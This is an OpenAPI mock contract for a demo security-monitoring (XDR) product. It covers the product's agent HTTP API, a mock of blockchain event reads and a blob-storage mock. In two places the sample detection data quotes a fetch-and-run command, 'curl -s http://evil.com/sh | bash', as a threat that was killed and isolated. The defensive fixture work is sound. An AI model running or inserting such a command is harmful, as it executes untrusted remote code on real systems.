@@ -1,0 +1,384 @@
+openapi: 3.1.0
+info:
+  title: Thorium XDR — Demo Mock Contract
+  version: gen-v1 (targets fe_design_v2)
+  description: >
+    Single source of truth for the Thorium XDR demo mock backend AND the frontend
+    data adapter. Models BOTH read/write sources behind the FE:
+
+      1. The Mowa agent headless HTTP API (`/api/*`) — wire keys are intentionally
+         Polish (kod/typ/tresc/klucz_pub…) to match the real agent
+         (`thorium_agent.mowa`). The adapter maps these to English view-models;
+         **no Polish reaches the UI**.
+      2. A Sui event/object mock (`/sui/*`) emulating fullnode JSON-RPC reads of
+         package 0x0cc3f972285b0486b2590b5edc9321813ec32a253a26cffa687da5a1131491af
+         (modules edr_registry / talus_xdr_detector / polonium_policy).
+      3. An optional Walrus blob mock (`/walrus/*`).
+
+    Note on the agent envelope: internally Mowa returns {kod,typ,tresc}; the actual
+    HTTP response uses kod=status, typ=Content-Type, body=tresc. This spec models
+    the REAL HTTP bodies (the `tresc` content).
+
+    Served by Stoplight Prism (`prism mock`) — every operation carries an `example`
+    so the mock returns realistic data with zero code.
+servers:
+  - url: http://localhost:4010
+    description: Prism mock (docker compose)
+tags:
+  - name: agent
+    description: Mowa agent HTTP API (/api/*)
+  - name: sui
+    description: Sui chain read mock (/sui/*)
+  - name: walrus
+    description: Walrus blob mock (/walrus/*)
+
+paths:
+  /api/status:
+    get:
+      tags: [agent]
+      operationId: getStatus
+      summary: Agent status + hardware fingerprint + identity
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/AgentStatus' }
+              example:
+                status: Active
+                fingerprint: "blake3:4110df0a9c2e..."
+                klucz_pub: "Ed25519:A1B2C3D4E5F6..."
+                hostname: alma9-edge-01
+                ip_address: "fde4:8dba:82e1::11"
+                owner_name: Jakub
+                machine_type: Server
+                hardware: { cpu: "x86_64", mem_gb: 16, os: "almalinux9" }
+
+  /api/logi:
+    get:
+      tags: [agent]
+      operationId: getLogs
+      summary: Raw agent log buffer
+      responses:
+        '200':
+          description: OK
+          content:
+            text/plain:
+              schema: { type: string }
+              example: |
+                --- THORIUM XDR SESSION START ---
+                [eBPF] execve curl -s http://evil.com/sh | bash -> KILLED_AND_ISOLATED
+                [FIM] /etc/shadow modified by LAST_COMMAND=passwd -> ALERT
+
+  /api/rpc:
+    post:
+      tags: [agent]
+      operationId: rpc
+      summary: JSON-RPC 2.0 (get_logs, vm_create)
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/RpcRequest' }
+            examples:
+              get_logs:
+                value: { jsonrpc: "2.0", id: 1, method: get_logs }
+              vm_create:
+                value: { jsonrpc: "2.0", id: 2, method: vm_create, params: { name: "edge-02", port: "8080", owner: "Jakub", type: "Server" } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/RpcResponse' }
+              example:
+                jsonrpc: "2.0"
+                id: 1
+                result: { status: created, msg: "VM edge-02 created on port 8080" }
+
+  /api/izoluj:
+    post:
+      tags: [agent]
+      operationId: isolateHost
+      summary: Isolate a host (agent-local response action)
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/AgentRef' }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/ActionResult' }
+              example: { ok: true, status: Isolated, msg: "Host isolated" }
+
+  /api/przywroc:
+    post:
+      tags: [agent]
+      operationId: restoreHost
+      summary: Restore a previously isolated host
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/AgentRef' }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/ActionResult' }
+              example: { ok: true, status: Active, msg: "Host restored" }
+
+  /api/vm/lista:
+    get:
+      tags: [agent]
+      operationId: listVms
+      summary: List VMs
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { type: array, items: { $ref: '#/components/schemas/Vm' } }
+              example:
+                - { name: edge-01, port: "8080", owner: Jakub, type: Server, status: running }
+                - { name: ws-07,   port: "8081", owner: Ola,   type: Workstation, status: stopped }
+
+  /api/vm/start:
+    post:
+      tags: [agent]
+      operationId: startVm
+      requestBody: { $ref: '#/components/requestBodies/VmRef' }
+      responses:
+        '200': { $ref: '#/components/responses/ActionOk' }
+
+  /api/vm/stop:
+    post:
+      tags: [agent]
+      operationId: stopVm
+      requestBody: { $ref: '#/components/requestBodies/VmRef' }
+      responses:
+        '200': { $ref: '#/components/responses/ActionOk' }
+
+  /api/vm/usun:
+    post:
+      tags: [agent]
+      operationId: deleteVm
+      requestBody: { $ref: '#/components/requestBodies/VmRef' }
+      responses:
+        '200': { $ref: '#/components/responses/ActionOk' }
+
+  /sui/queryEvents:
+    post:
+      tags: [sui]
+      operationId: queryEvents
+      summary: Mock of Sui fullnode suix_queryEvents (by package/module)
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                module: { type: string, enum: [edr_registry, talus_xdr_detector, polonium_policy] }
+                eventType: { type: string, description: "e.g. IncidentReport, TelemetryReported" }
+                cursor: { type: [string, "null"] }
+                limit: { type: integer, default: 50 }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/EventPage' }
+              example:
+                hasNextPage: false
+                nextCursor: null
+                data:
+                  - type: "0x0cc3...::edr_registry::IncidentReport"
+                    timestampMs: 1718800000000
+                    txDigest: "9aBcDeF..."
+                    parsedJson:
+                      agent_id: "0x1a2b...3c4d"
+                      severity: CRITICAL
+                      process_cmd: "curl -s http://evil.com/sh | bash"
+                      action_taken: KILLED_AND_ISOLATED
+                  - type: "0x0cc3...::edr_registry::TelemetryReported"
+                    timestampMs: 1718800030000
+                    txDigest: "7xYz..."
+                    parsedJson:
+                      agent_id: "0x4b5c...6a7b"
+                      cpu_load: 45
+                      ram_usage_pct: 61
+                      disk_usage_pct: 38
+                      timestamp_ms: 1718800030000
+                  - type: "0x0cc3...::talus_xdr_detector::ClassificationReported"
+                    timestampMs: 1718800060000
+                    txDigest: "Qw3R..."
+                    parsedJson:
+                      agent_id: "0x1a2b...3c4d"
+                      telemetry_hash: "blake3:aa11..."
+                      anomaly_score: 91
+                      classification: "credential_dumping"
+                      action_taken: TRIGGER_ISOLATION
+                      timestamp_ms: 1718800060000
+
+  /sui/multiGetObjects:
+    post:
+      tags: [sui]
+      operationId: multiGetObjects
+      summary: Mock of sui_multiGetObjects (shared objects + AgentIdentity SBTs)
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                ids: { type: array, items: { type: string } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { type: array, items: { $ref: '#/components/schemas/SuiObject' } }
+              example:
+                - objectId: "0x1a2b...3c4d"
+                  type: "0x0cc3...::edr_registry::AgentIdentity"
+                  content:
+                    owner_address: "0xowner1"
+                    owner_name: Jakub
+                    hostname: alma9-edge-01
+                    ipv6_address: "fde4:8dba:82e1::11"
+                    machine_type: Server
+                    hardware_hash: "blake3:4110df0..."
+                    public_key: "Ed25519:A1B2..."
+                    is_active: true
+                - objectId: "0xpolicyTalus"
+                  type: "0x0cc3...::talus_xdr_detector::DetectionPolicy"
+                  content: { admin: "0xadmin", anomaly_threshold: 85 }
+                - objectId: "0xpolicyPolonium"
+                  type: "0x0cc3...::polonium_policy::PoloniumConfig"
+                  content:
+                    admin: "0xadmin"
+                    walrus_blob_id: "walrus:blob:placeholder_polonium_config_v1"
+                    policy_hash: "sha256:0011..."
+                    expires_at_ms: 1783300000000
+
+  /walrus/{blobId}:
+    get:
+      tags: [walrus]
+      operationId: getBlob
+      summary: Mock Walrus blob fetch (sealed payloads referenced on-chain)
+      parameters:
+        - name: blobId
+          in: path
+          required: true
+          schema: { type: string }
+      responses:
+        '200':
+          description: OK (sealed/placeholder)
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/WalrusBlob' }
+              example: { blobId: "walrus:blob:placeholder_polonium_config_v1", sealed: true, sizeBytes: 2048 }
+
+components:
+  requestBodies:
+    VmRef:
+      required: true
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/VmRef' }
+          example: { name: edge-01 }
+  responses:
+    ActionOk:
+      description: OK
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/ActionResult' }
+          example: { ok: true, msg: "done" }
+  schemas:
+    AgentStatus:
+      type: object
+      description: GET /api/status body. Polish wire keys mapped to English in adapter.
+      properties:
+        status: { type: string, description: "Active | Isolated | Pending | Offline" }
+        fingerprint: { type: string, description: "BLAKE3 hardware hash" }
+        klucz_pub: { type: string, description: "Ed25519 public key" }
+        hostname: { type: string }
+        ip_address: { type: string }
+        owner_name: { type: string }
+        machine_type: { type: string, description: "Workstation | Server" }
+        hardware: { type: object, additionalProperties: true }
+    RpcRequest:
+      type: object
+      required: [jsonrpc, id]
+      properties:
+        jsonrpc: { type: string, const: "2.0" }
+        id: { type: integer }
+        method: { type: string, enum: [get_logs, vm_create] }
+        params: { type: object, additionalProperties: true }
+    RpcResponse:
+      type: object
+      properties:
+        jsonrpc: { type: string, const: "2.0" }
+        id: { type: integer }
+        result: { type: object, additionalProperties: true }
+        error:
+          type: object
+          properties:
+            code: { type: integer }
+            message: { type: string }
+    Vm:
+      type: object
+      properties:
+        name: { type: string }
+        port: { type: string }
+        owner: { type: string }
+        type: { type: string }
+        status: { type: string, description: "running | stopped" }
+    VmRef:
+      type: object
+      required: [name]
+      properties:
+        name: { type: string }
+    AgentRef:
+      type: object
+      properties:
+        agent: { type: string, description: "Agent SBT id (0x…)" }
+    ActionResult:
+      type: object
+      properties:
+        ok: { type: boolean }
+        status: { type: string }
+        msg: { type: string }
+    EventPage:
+      type: object
+      properties:
+        hasNextPage: { type: boolean }
+        nextCursor: { type: [string, "null"] }
+        data:
+          type: array
+          items: { $ref: '#/components/schemas/SuiEvent' }
+    SuiEvent:
+      type: object
+      properties:
+        type: { type: string }
+        timestampMs: { type: integer }
+        txDigest: { type: string }
+        parsedJson: { type: object, additionalProperties: true }
+    SuiObject:
+      type: object
+      properties:
+        objectId: { type: string }
+        type: { type: string }
+        content: { type: object, additionalProperties: true }
+    WalrusBlob:
+      type: object
+      properties:
+        blobId: { type: string }
+        sealed: { type: boolean }
+        sizeBytes: { type: integer }
